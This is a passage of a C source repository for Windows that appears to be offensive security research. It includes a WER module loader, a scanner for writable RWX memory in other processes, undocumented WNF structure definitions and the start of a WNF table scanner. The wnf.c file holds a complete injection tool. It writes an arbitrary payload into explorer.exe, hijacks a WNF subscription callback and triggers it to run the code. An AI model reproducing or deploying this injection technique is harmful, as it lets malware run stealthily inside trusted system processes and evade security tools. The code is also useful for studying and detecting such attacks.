      if(pid==0) { 
        wprintf(L"usage: tpplist <process name | process id>\n");
        return 0;
      }
    }
    SetPrivilege(SE_DEBUG_NAME, TRUE);
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    ScanSystem(pid, symbol, type);
    
    return 0;
}
```

`wer/werload.c`:

```c

#define UNICODE
#include <windows.h>
#include <werapi.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

#include <stdio.h>

typedef HRESULT (WINAPI *_WerRegisterMemoryBlockWorker)(PVOID Address, ULONG Size);

int test(void) {
  return 0;
}

int main(void) {
    HRESULT hr;
    WCHAR   path[MAX_PATH];
    HMODULE m;
    PVOID ds;
    _WerRegisterMemoryBlockWorker = (_WerRegisterMemoryBlockWorker)GetProcAddress(
      GetModuleHandle(L"kernel32"), "WerRegisterMemoryBlockWorker");
    
    m = GetModuleHandle(L"kernel32");
    //ds = VirtualAlloc();
    
    hr = WerRegisterMemoryBlockWorker((PVOID)test, 32);
    
    GetModuleFileName (NULL, path, MAX_PATH);
    PathRemoveFileSpec(path);
    PathAppend(path, L"wermodule.dll");
    hr = WerRegisterRuntimeExceptionModule(path, NULL);

    GetModuleFileName (NULL, path, MAX_PATH);
    PathRemoveFileSpec(path);
    PathAppend(path, L"wermodule2.dll");
    hr = WerRegisterRuntimeExceptionModule(path, NULL);
    
    //WerRegisterMemoryBlockWorker
    
    getchar();
    //RaiseException (0xABCD1234, EXCEPTION_NONCONTINUABLE, 0, NULL);
    
    WerUnregisterRuntimeExceptionModule(path, NULL);
    return 0;
}

```

`wer/wermodule.c`:

```c
#define WIN32_LEAN_AND_MEAN
#define UNICODE
#include <windows.h>
#include <werapi.h>

#pragma comment(lib, "user32.lib")

// WER calls this function to determine whether the exception handler is claiming the crash.
__declspec(dllexport)
HRESULT WINAPI PfnWerRuntimeExceptionEvent(
  PVOID pContext,
  const PWER_RUNTIME_EXCEPTION_INFORMATION pExceptionInformation,
  BOOL *pbOwnershipClaimed,
  PWSTR pwszEventName,
  PDWORD pchSize,
  PDWORD pdwSignatureCount)
{
  *pbOwnershipClaimed = FALSE;
  return S_OK;
}

// WER can call this function multiple times to get the report parameters that uniquely describe the problem.
__declspec(dllexport)
HRESULT WINAPI PfnWerRuntimeExceptionEventSignature(
  PVOID pContext,
  const PWER_RUNTIME_EXCEPTION_INFORMATION pExceptionInformation,
  DWORD dwIndex,
  PWSTR pwszName,
  PDWORD pchName,
  PWSTR pwszValue,
  PDWORD pchValue)
{
  return S_OK;
}

// WER calls this function to let you customize the debugger launch options and launch string.
__declspec(dllexport)
HRESULT WINAPI PfnWerRuntimeExceptionDebuggerLaunch(
  PVOID pContext,
  const PWER_RUNTIME_EXCEPTION_INFORMATION pExceptionInformation,
  PBOOL pbIsCustomDebugger,
  PWSTR pwszDebuggerLaunch,
  PDWORD pchDebuggerLaunch,
  PBOOL pbIsDebuggerAutolaunch)
{
  *pbIsCustomDebugger = FALSE;
  return S_OK;
}

__declspec(dllexport)
BOOL WINAPI DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
  switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
      MessageBox(NULL, L"Hello, World!", L"WER Module", MB_OK);
      break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
      break;
  }
  return TRUE;
}

```

`wnf/scanners.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../ntlib/util.h"

// just read and write back a pointer
BOOL WriteAccess(HANDLE hp, LPVOID addr) {
    BOOL      bWrite;
    ULONG_PTR p;
    SIZE_T    len;
    
    // read
    bWrite = ReadProcessMemory(hp, addr, &p, sizeof(p), &len);
    if(bWrite && len == sizeof(p)) {
      // write
      bWrite = WriteProcessMemory(hp, addr, &p, sizeof(p), &len);
    }
    return bWrite;
}

VOID ScanProcess(DWORD pid, LPWSTR name) {
    HANDLE                   hProcess;
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    SIZE_T                   res;
    BYTE                     buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO             pSymbol=(PSYMBOL_INFO)buffer;
    
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    if (hProcess != NULL) {
      SymInitialize(hProcess, NULL, TRUE);
      GetSystemInfo(&si);
      
      for (addr=0; addr < (LPBYTE)si.lpMaximumApplicationAddress;) {
        ZeroMemory(&mbi, sizeof(mbi));
        res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));
        if(res != sizeof(mbi)) break;
        
        if(mbi.Protect & PAGE_EXECUTE_READWRITE) {
          // do we have write access to this executable area of memory?
          if(WriteAccess(hProcess, mbi.BaseAddress)) {
            // show the process, address and size of cave
            wprintf(L"RWX : %-20ws : %p : %zi\n", 
              name, mbi.BaseAddress, mbi.RegionSize);
          }
        }
        /**
        if(mbi.Type == MEM_IMAGE) {
          wprintf(L"RX : %-20ws : %p : %zi\n", 
            name, mbi.BaseAddress, mbi.RegionSize);          
        }*/
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
      }
      SymCleanup(hProcess);
      CloseHandle(hProcess);
    }
}

VOID ScanSystem(DWORD pid) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    BOOL           bFound=FALSE;
    
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hSnap, &pe32)){
      do {
        if(pid != 0 && pe32.th32ProcessID != pid) continue;
        ScanProcess(pe32.th32ProcessID, pe32.szExeFile);
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
}

int main(void) {
    PWCHAR *argv;
    int    argc;
    DWORD  pid = 0;
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    SetPrivilege(SE_DEBUG_NAME, TRUE);

    if(argc == 2) {
      pid = name2pid(argv[1]);
      if(pid == 0) pid = _wtoi(argv[1]);
      if(pid == 0) {
        printf("unable to resolve pid for \"%ws\"\n", argv[1]);
        return 0;
      }
    }
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    ScanSystem(pid);
    return 0;
}

```

`wnf/wnf.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"
#include "wnf.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

#define WNF_SHEL_LOGON_COMPLETE            0xd83063ea3bc1875

typedef NTSTATUS
(NTAPI *NtUpdateWnfStateData_t)(
    _In_ PVOID StateName,
    _In_reads_bytes_opt_(Length) const VOID *Buffer,
    _In_opt_ ULONG Length,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const VOID *ExplicitScope,
    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
    _In_ LOGICAL CheckStamp);
    
LPVOID GetUserSubFromTable(
    HANDLE                 hp, 
    LPVOID                 addr,
    PWNF_USER_SUBSCRIPTION us,
    ULONG64                sn)
{
    BOOL                   bRead;
    SIZE_T                 rd;
    LIST_ENTRY             stle, nsle, *nte, *use;
    WNF_NAME_SUBSCRIPTION  ns;
    PBYTE                  p;
    ULONG64                x;
    LPVOID                 sa = NULL;

    // read NamesTableEntry into local memory
    ReadProcessMemory(
      hp, 
      (PBYTE)addr + offsetof(WNF_SUBSCRIPTION_TABLE, NamesTableEntry), 
      &stle, sizeof(stle), &rd);
     
    // for each name subscription
    nte = stle.Flink;
    for(;;) {    
      // read WNF_NAME_SUBSCRIPTION into local memory    
      p = (PBYTE)nte - offsetof(WNF_NAME_SUBSCRIPTION, NamesTableEntry);
      bRead = ReadProcessMemory(
        hp, (PBYTE)p, &ns, sizeof(ns), &rd);
      if(!bRead) break;
      
      x = *(ULONG64*)&ns.StateName;
      // is it our user subcription?
      if(x == sn) {
        // read first entry and exit loop
        use = ns.SubscriptionsListHead.Flink;
        // read WNF_USER_SUBSCRIPTION into local memory
        sa = (PBYTE)use - offsetof(WNF_USER_SUBSCRIPTION, SubscriptionsListEntry);
        ReadProcessMemory(
          hp, (PBYTE)sa, us, sizeof(WNF_USER_SUBSCRIPTION), &rd);
        break;
      }
      // last one? break from loop
      if(nte == stle.Blink) break;
        
      // read LIST_ENTRY
      bRead = ReadProcessMemory(
        hp, (PBYTE)nte, &nsle, sizeof(nsle), &rd);
      if(!bRead) break;
      
      nte = nsle.Flink;
    }
    return sa;
}

// try find the subscription table by header
// returns TRUE if found, else FALSE
LPVOID FindWnfSubTable(
    HANDLE                    hp, 
    PMEMORY_BASIC_INFORMATION mbi,
    PWNF_USER_SUBSCRIPTION    us,
    ULONG64                   sn) 
{
    SIZE_T                 pos;
    SIZE_T                 rd;
    WNF_SUBSCRIPTION_TABLE st;
    LPVOID                 sa = NULL;
    
    for(pos = 0;
        pos < (mbi->RegionSize - sizeof(WNF_SUBSCRIPTION_TABLE));
        pos++) 
    {  
      // try read size of table
      ReadProcessMemory(
        hp, (PBYTE)mbi->BaseAddress + pos, &st, 
        sizeof(WNF_SUBSCRIPTION_TABLE), &rd);

      if(rd != sizeof(WNF_SUBSCRIPTION_TABLE)) break;

        // found WNF table?
      if(st.Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE && 
         st.Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE)) {
        // read user subscription for state name
        sa = GetUserSubFromTable(hp, (PBYTE)mbi->BaseAddress + pos, us, sn);
        break;
      }
    }
    return sa;
}

// this method searches all writeable areas of memory for the WNF table
// much slower than version searching data segment
LPVOID GetUserSubFromProcessOld(
  HANDLE hp, PWNF_USER_SUBSCRIPTION us, ULONG64 sn) 
{
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;
    SIZE_T                   res;
    LPVOID                   sa = NULL;
    
    GetSystemInfo(&si);
      
    for(addr = 0; 
        addr < (LPBYTE)si.lpMaximumApplicationAddress;
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize) 
    {
      ZeroMemory(&mbi, sizeof(mbi));
      res = VirtualQueryEx(hp, addr, &mbi, sizeof(mbi));
      if(res != sizeof(mbi)) break;
        
      // heap memory? (can be stack too)
      if ((mbi.State   == MEM_COMMIT)  &&
          (mbi.Type    == MEM_PRIVATE) && 
          (mbi.Protect == PAGE_READWRITE))  
      {
        // try find user sub in this block
        sa = FindWnfSubTable(hp, &mbi, us, sn);
        if(sa != NULL) break;
      }
    }
    return sa;
}

LPVOID GetUserSubFromProcess(
  HANDLE hp, DWORD pid, PWNF_USER_SUBSCRIPTION us, ULONG64 sn)
{
    LPVOID                   m, rm, va = NULL, sa = NULL;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, cnt;
    PULONG_PTR               ds;
    ULONG_PTR                ptr;
    MEMORY_BASIC_INFORMATION mbi;
    PWNF_SUBSCRIPTION_TABLE  tbl;
    SIZE_T                   rd;
    WNF_SUBSCRIPTION_TABLE   st;
    
    // Storage Protection Windows Runtime automatically subscribes to WNF. 
    // Loading efswrt.dll will create the table if not already initialized.
    // Search the data segment of NTDLL and obtain the Relative Virtual Address of WNF table
    // Read the base address of NTDLL from remote process and add to RVA
    // Read pointer to heap in remote process.
    // Finally, read a user subscription
    LoadLibrary(L"efswrt.dll");

    // load local copy
    m   = LoadLibrary(L"ntdll.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    // for each pointer
    for(i=0; i<cnt; i++) {
      if(!IsHeapPtr((LPVOID)ds[i])) continue;
      
      tbl = (PWNF_SUBSCRIPTION_TABLE)ds[i];
      // if it looks like subscription table resides here
      if(tbl->Header.NodeTypeCode == WNF_NODE_SUBSCRIPTION_TABLE && 
         tbl->Header.NodeByteSize == sizeof(WNF_SUBSCRIPTION_TABLE)) 
      {
        // save the virtual address
        va = (PBYTE)&ds[i];
        break;
      }
    }
    if(va != NULL) {
      ReadProcessMemory(hp, va, &ptr, sizeof(ULONG_PTR), &rd);
      // read a user subscription from remote
      sa = GetUserSubFromTable(hp, (LPVOID)ptr, us, sn);
    }
    return sa;
}
    
VOID wnf_inject(LPVOID payload, DWORD payloadSize) {
    WNF_USER_SUBSCRIPTION  us;
    LPVOID                 sa, cs;
    HWND                   hw;
    HANDLE                 hp;
    DWORD                  pid;
    SIZE_T                 wr;
    ULONG64                ns = WNF_SHEL_LOGON_COMPLETE;
    NtUpdateWnfStateData_t _NtUpdateWnfStateData;
    HMODULE                m;
      
    // 1. Open explorer.exe
    hw = FindWindow(L"Shell_TrayWnd", NULL);
    GetWindowThreadProcessId(hw, &pid);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 2. Locate user subscription
    sa = GetUserSubFromProcess(hp, pid, &us, WNF_SHEL_LOGON_COMPLETE);
    
    // 3. Allocate RWX memory and write payload
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. Update callback and trigger execution of payload
    WriteProcessMemory(
      hp, 
      (PBYTE)sa + offsetof(WNF_USER_SUBSCRIPTION, Callback), 
      &cs,
      sizeof(ULONG_PTR),
      &wr);
      
    m = GetModuleHandle(L"ntdll");
    _NtUpdateWnfStateData = 
      (NtUpdateWnfStateData_t)GetProcAddress(m, "NtUpdateWnfStateData");
      
    _NtUpdateWnfStateData(
      &ns, NULL, 0, 0, NULL, 0, 0);
    
    Sleep(0);
    
    // 5. Restore original callback, free memory and close process
    WriteProcessMemory(
      hp, 
      (PBYTE)sa + offsetof(WNF_USER_SUBSCRIPTION, Callback), 
      &us.Callback,
      sizeof(ULONG_PTR),
      &wr);
    
    VirtualFreeEx(hp, cs, 0, MEM_RELEASE);
    CloseHandle(hp);
}

int wmain(int argc, wchar_t *argv[]) {
    LPVOID payload;
    DWORD  pid, payloadSize;
    
    if(argc != 2) {
      wprintf(L"usage: wnf <payload>\n");
      return 0;
    }
    // read payload
    payloadSize = readpic(argv[1], &payload);
    if(payloadSize == 0) { wprintf(L"unable to read from %s\n", argv[1]); return 0; }
    
    // inject payload
    wnf_inject(payload, payloadSize);
    return 0;
}
```

`wnf/wnf.h`:

```h
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#ifndef WNF_H
#define WNF_H

#define WNF_STATE_KEY                0x41C64E6DA3BC0074

// kernel-mode structures
#define WNF_NODE_SCOPE_MAP           0x901
#define WNF_NODE_SCOPE_INSTANCE      0x902
#define WNF_NODE_NAME_INSTANCE       0x903
#define WNF_NODE_STATE_DATA          0x904
#define WNF_NODE_SUBSCRIBE_INSTANCE  0x905
#define WNF_NODE_PROCESS_CONTEXT     0x906

// user-mode structures
#define WNF_NODE_SUBSCRIPTION_TABLE  0x911
#define WNF_NODE_NAME_SUBSCRIPTION   0x912
#define WNF_NODE_SERIALIZATION_GROUP 0x913
#define WNF_NODE_USER_SUBSCRIPTION   0x914

typedef enum _WNF_STATE_NAME_LIFETIME {
    WnfWellKnownStateName  = 0x0,
    WnfPermanentStateName  = 0x1,
    WnfPersistentStateName = 0x2,
    WnfTemporaryStateName  = 0x3
} WNF_STATE_NAME_LIFETIME;

typedef enum _WNF_DATA_SCOPE {
    WnfDataScopeSystem  = 0x0,
    WnfDataScopeSession = 0x1,
    WnfDataScopeUser    = 0x2,
    WnfDataScopeProcess = 0x3,
    WnfDataScopeMachine = 0x4
} WNF_DATA_SCOPE;

typedef enum _WNF_STATE_NAME_INFORMATION {
    WnfInfoStateNameExist     = 0x0,
    WnfInfoSubscribersPresent = 0x1,
    WnfInfoIsQuiescent        = 0x2
} WNF_STATE_NAME_INFORMATION;

typedef struct _WNF_STATE_NAME_INTERNAL {
    ULONG64 Version       :4;
    ULONG64 NameLifetime  :2;
    ULONG64 DataScope     :4;
    ULONG64 PermanentData :1;
    ULONG64 Unique        :53;
} WNF_STATE_NAME_INTERNAL, *PWNF_STATE_NAME_INTERNAL;

typedef ULONG LOGICAL;
typedef ULONG *PLOGICAL;

typedef struct _WNF_STATE_NAME {
    ULONG                             Data[2];
} WNF_STATE_NAME, *PWNF_STATE_NAME;

typedef const struct _WNF_STATE_NAME* PCWNF_STATE_NAME;

typedef struct _WNF_TYPE_ID {
    GUID                              TypeId;
} WNF_TYPE_ID, *PWNF_TYPE_ID;

typedef const WNF_TYPE_ID* PCWNF_TYPE_ID;

typedef ULONG WNF_CHANGE_STAMP, *PWNF_CHANGE_STAMP;

typedef struct _WNF_DELIVERY_DESCRIPTOR {
    ULONG64                           SubscriptionId;
    WNF_STATE_NAME                    StateName;
    WNF_CHANGE_STAMP                  ChangeStamp;
    ULONG                             StateDataSize;
    ULONG                             EventMask;
    WNF_TYPE_ID                       TypeId;
    ULONG                             StateDataOffset;
} WNF_DELIVERY_DESCRIPTOR, *PWNF_DELIVERY_DESCRIPTOR;

typedef struct _WNF_CONTEXT_HEADER {
    USHORT                            NodeTypeCode;
    USHORT                            NodeByteSize;
} WNF_CONTEXT_HEADER, *PWNF_CONTEXT_HEADER;

typedef struct _WNF_SUBSCRIPTION_TABLE {
    WNF_CONTEXT_HEADER                Header;
    SRWLOCK                           NamesTableLock;
    LIST_ENTRY                        NamesTableEntry;
    LIST_ENTRY                        SerializationGroupListHead;
    SRWLOCK                           SerializationGroupLock;
    DWORD                             Unknown1[2];
    DWORD                             SubscribedEventSet;
    DWORD                             Unknown2[2];
    PTP_TIMER                         Timer;
    ULONG64                           TimerDueTime;
} WNF_SUBSCRIPTION_TABLE, *PWNF_SUBSCRIPTION_TABLE;

typedef struct _WNF_NAME_SUBSCRIPTION {
    WNF_CONTEXT_HEADER                Header;
    ULONG64                           SubscriptionId;
    WNF_STATE_NAME_INTERNAL           StateName;
    WNF_CHANGE_STAMP                  CurrentChangeStamp;
    LIST_ENTRY                        NamesTableEntry;
    PWNF_TYPE_ID                      TypeId;
    SRWLOCK                           SubscriptionLock;
    LIST_ENTRY                        SubscriptionsListHead;
    ULONG                             NormalDeliverySubscriptions;
    ULONG                             NotificationTypeCount[5];
    PWNF_DELIVERY_DESCRIPTOR          RetryDescriptor;
    ULONG                             DeliveryState;
    ULONG64                           ReliableRetryTime;
} WNF_NAME_SUBSCRIPTION, *PWNF_NAME_SUBSCRIPTION;

typedef struct _WNF_SERIALIZATION_GROUP {
    WNF_CONTEXT_HEADER                Header;
    ULONG                             GroupId;
    LIST_ENTRY                        SerializationGroupList;
    ULONG64                           SerializationGroupValue;
    ULONG64                           SerializationGroupMemberCount;
} WNF_SERIALIZATION_GROUP, *PWNF_SERIALIZATION_GROUP;

typedef NTSTATUS (*PWNF_USER_CALLBACK) (
    WNF_STATE_NAME                    StateName,
    WNF_CHANGE_STAMP                  ChangeStamp,
    PWNF_TYPE_ID                      TypeId,
    PVOID                             CallbackContext,
    PVOID                             Buffer,
    ULONG                             BufferSize);
    
typedef struct _WNF_USER_SUBSCRIPTION {
    WNF_CONTEXT_HEADER                Header;
    LIST_ENTRY                        SubscriptionsListEntry;
    PWNF_NAME_SUBSCRIPTION            NameSubscription;
    PWNF_USER_CALLBACK                Callback;
    PVOID                             CallbackContext;
    ULONG64                           SubProcessTag;
    ULONG                             CurrentChangeStamp;
    ULONG                             DeliveryOptions;
    ULONG                             SubscribedEventSet;
    PWNF_SERIALIZATION_GROUP          SerializationGroup;
    ULONG                             UserSubscriptionCount;
    ULONG64                           Unknown[10];
} WNF_USER_SUBSCRIPTION, *PWNF_USER_SUBSCRIPTION;

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateWnfStateName(
    _Out_ PWNF_STATE_NAME StateName,
    _In_ WNF_STATE_NAME_LIFETIME NameLifetime,
    _In_ WNF_DATA_SCOPE DataScope,
    _In_ BOOLEAN PersistData,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_ ULONG MaximumStateSize,
    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtDeleteWnfStateName(
    _In_ PCWNF_STATE_NAME StateName
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtUpdateWnfStateData(
    _In_ PCWNF_STATE_NAME StateName,
    _In_reads_bytes_opt_(Length) const VOID *Buffer,
    _In_opt_ ULONG Length,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const VOID *ExplicitScope,
    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
    _In_ LOGICAL CheckStamp
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtDeleteWnfStateData(
    _In_ PCWNF_STATE_NAME StateName,
    _In_opt_ const VOID *ExplicitScope
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryWnfStateData(
    _In_ PCWNF_STATE_NAME StateName,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const VOID *ExplicitScope,
    _Out_ PWNF_CHANGE_STAMP ChangeStamp,
    _Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,
    _Inout_ PULONG BufferSize
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryWnfStateNameInformation(
    _In_ PCWNF_STATE_NAME StateName,
    _In_ WNF_STATE_NAME_INFORMATION NameInfoClass,
    _In_opt_ const VOID *ExplicitScope,
    _Out_writes_bytes_(InfoBufferSize) PVOID InfoBuffer,
    _In_ ULONG InfoBufferSize
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSubscribeWnfStateChange(
    _In_ PCWNF_STATE_NAME StateName,
    _In_opt_ WNF_CHANGE_STAMP ChangeStamp,
    _In_ ULONG EventMask,
    _Out_opt_ PULONG64 SubscriptionId
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtUnsubscribeWnfStateChange(
    _In_ PCWNF_STATE_NAME StateName
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtGetCompleteWnfStateSubscription(
    _In_opt_ PWNF_STATE_NAME OldDescriptorStateName,
    _In_opt_ ULONG64 *OldSubscriptionId,
    _In_opt_ ULONG OldDescriptorEventMask,
    _In_opt_ ULONG OldDescriptorStatus,
    _Out_writes_bytes_(DescriptorSize) PWNF_DELIVERY_DESCRIPTOR NewDeliveryDescriptor,
    _In_ ULONG DescriptorSize
    );

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetWnfProcessNotificationEvent(
    _In_ HANDLE NotificationEvent
    );


typedef struct _CT_CONTEXT {
    PTP_WORK                          WorkItem;
    PWNF_USER_SUBSCRIPTION            Subscription;
    HANDLE                            hEvent;
} CT_CONTEXT, *PCT_CONTEXT;

typedef struct _tagWnfName {
    const WCHAR* Name;
    ULONG64      StateName;
} WnfName;

#endif
```

`wnf/wnfscan.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../ntlib/util.h"
#include "wnf.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

const WCHAR *stateName2str(ULONG64 StateName);
ULONG64 strName2state(const WCHAR *name);

VOID DumpWnfTable(
    HANDLE                 hp, 
    LPVOID                 addr,
    PPROCESSENTRY32        pe32,
    ULONG64                stateName)
{
    BOOL                   bRead;
    SIZE_T                 rd;
    LIST_ENTRY             stle, nsle, usle, *nte, *use;
    WNF_USER_SUBSCRIPTION  us;
    WNF_NAME_SUBSCRIPTION  ns;
    WNF_SUBSCRIPTION_TABLE st;
    PBYTE                  p;
    ULONG64                x;
    WCHAR                  cbfile[MAX_PATH], ctfile[MAX_PATH];
